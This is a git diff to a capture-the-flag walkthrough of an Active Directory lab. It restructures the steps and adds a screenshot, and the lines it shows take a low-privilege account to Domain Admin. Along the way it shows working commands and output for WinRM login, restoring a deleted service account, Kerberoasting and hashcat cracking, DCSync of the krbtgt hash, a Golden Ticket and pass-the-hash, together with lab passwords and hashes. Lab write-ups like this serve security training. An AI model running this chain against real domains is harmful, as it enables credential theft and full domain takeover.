@@ -138,12 +138,15 @@ nxc smb 192.168.31.100 -u i.ivanov -p 'Password1'
 ```
 SMB  192.168.31.100  445  DC01  [+] corp.local\i.ivanov:Password1
 ```
+![BloodHound - i.ivanov in Helpdesk](screenshots/02-helpdesk-properties.png)
+
+i.ivanov in Remote Management Users --> WinRm
 
 ### 4. Access DC01 via WinRM + Read user.txt
 
 **Goal:** use `i.ivanov` credentials to access DC01 via WinRM and read the user flag.
 
-**Note:** `i.ivanov` is a member of `Remote Management Users` (part of lab setup).
+**Prerequisite:** `i.ivanov` is a member of `Remote Management Users` (part of lab setup). Without this membership, WinRM access will fail with `Access Denied`.
 
 **Login via evil-winrm:**
 
@@ -160,13 +163,14 @@ evil-winrm -i 192.168.31.100 -u i.ivanov -p 'Password1'
 **Verify group membership:**
 
 ```powershell
-whoami /groups | findstr "Helpdesk"
+whoami /groups | findstr "Helpdesk Remote"
 ```
 
 **Output:**
 
 ```
-CORP\Helpdesk    Group    S-1-5-21-446035775-811873913-1701138034-1120    Mandatory group, Enabled by default, Enabled group
+CORP\Helpdesk                              Group    S-1-5-21-446035775-811873913-1701138034-1120    Mandatory group, Enabled by default, Enabled group
+CORP\Remote Management Users               Group    S-1-5-21-446035775-811873913-1701138034-1121    Mandatory group, Enabled by default, Enabled group
 ```
 
 **Read user flag:**
@@ -181,31 +185,9 @@ type C:\Users\i.ivanov\Desktop\user.txt
 CORP{user_flag_ivanov_2026}
 ```
 
-### 5. Enumerate i.ivanov Group Membership
-
-**Goal:** verify `i.ivanov` is a member of `Helpdesk` (BloodHound).
-
-![BloodHound - i.ivanov in Helpdesk](screenshots/01-ivanov-helpdesk.png)
-
 **Meaning:** `i.ivanov` inherits `Helpdesk` permissions, including `Reanimate Tombstones` on the domain.
 
-### 6. Enumerate Helpdesk Permissions
-
-![BloodHound - Helpdesk properties](screenshots/02-helpdesk-properties.png)
-
-**Check Reanimate Tombstones:**
-
-```powershell
-dsacls (Get-ADDomain).DistinguishedName | Select-String "Helpdesk"
-```
-
-**Output:**
-
-```
-Allow CORP\Helpdesk    Reanimate Tombstones
-```
-
-### 7. Enumerate Deleted Objects
+### 6. Enumerate Deleted Objects
 
 **Goal:** find deleted users in AD.
 
@@ -231,7 +213,7 @@ objectGUID:: MXiqdGCsbEy88DxCsxC66g==
 
 **Result:** `svc_legacy` found in Deleted Objects.
 
-### 8. Restore svc_legacy (via evil-winrm as i.ivanov)
+### 7. Restore svc_legacy (via evil-winrm as i.ivanov)
 
 **Goal:** restore `svc_legacy` using `Helpdesk` permissions via WinRM.
 
@@ -243,16 +225,22 @@ objectGUID:: MXiqdGCsbEy88DxCsxC66g==
 - `Helpdesk` has `FULL CONTROL` on `OU=ServiceAccounts`.
 - `Helpdesk` has `FULL CONTROL` on the deleted object itself.
 
-**Restore svc_legacy:**
+**Check Reanimate Tombstones:**
 
 ```powershell
-Restore-ADObject -Identity "74aa7831-ac60-4c6c-bcf0-3c42b310baea" -TargetPath "OU=ServiceAccounts,OU=Company,DC=corp,DC=local"
+dsacls (Get-ADDomain).DistinguishedName | Select-String "Helpdesk"
 ```
 
 **Output:**
 
 ```
-(no output — success)
+Allow CORP\Helpdesk    Reanimate Tombstones
+```
+
+**Restore svc_legacy:**
+
+```powershell
+Restore-ADObject -Identity "74aa7831-ac60-4c6c-bcf0-3c42b310baea" -TargetPath "OU=ServiceAccounts,OU=Company,DC=corp,DC=local"
 ```
 
 **Verify:**
@@ -271,12 +259,12 @@ svc_legacy   {MSSQLSvc/legacy01.corp.local:1433}
 
 **Result:** `svc_legacy` restored with SPN.
 
-### 9. Kerberoast svc_legacy
+### 8. Kerberoast svc_legacy
 
 **Goal:** obtain TGS hash of `svc_legacy` (SPN).
 
 ```bash
-GetUserSPNs.py corp.local/i.ivanov:'Password1' -dc-ip 192.168.31.100 -request -outputfile /tmp/svc_legacy_tgs.txt
+GetUserSPNs.py corp.local/i.ivanov:'Password1' -dc-ip 192.168.31.100 -request 
 ```
 
 **Output:**
@@ -290,7 +278,7 @@ MSSQLSvc/legacy01.corp.local:1433 svc_legacy  CN=Backup Operators,...
 **Crack:**
 
 ```bash
-hashcat -m 13100 /tmp/svc_legacy_tgs.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
 **Output:**
@@ -302,7 +290,7 @@ Status...........: Cracked
 
 **Result:** `svc_legacy : Barcelona1`
 
-### 10. DCSync (svc_legacy → krbtgt)
+### 9. DCSync (svc_legacy → krbtgt)
 
 **Goal:** extract `krbtgt` hash via DCSync.
 
@@ -329,7 +317,7 @@ krbtgt:des-cbc-md5:4a688ff734dcf231
 
 **Result:** `krbtgt` hash = `3b6c421806dafb492a3a26f87c55dc39`
 
-### 11. Golden Ticket
+### 10. Golden Ticket
 
 **Goal:** create Golden Ticket for `Administrator`.
 
@@ -366,7 +354,7 @@ Valid starting       Expires              Service principal
         renew until 09/14/2036 00:57:29
 ```
 
-### 12. Domain Admin
+### 11. Domain Admin
 
 **Goal:** use Golden Ticket to access DC01 and read system/root flags.
 
@@ -406,7 +394,7 @@ CORP{root_flag_domain_compromised}
 
 **Result:** Domain Admin achieved.
 
-### 13. Verify Domain Admin via Pass-the-Hash
+### 12. Verify Domain Admin via Pass-the-Hash
 
 **DCSync Administrator hash:**
 
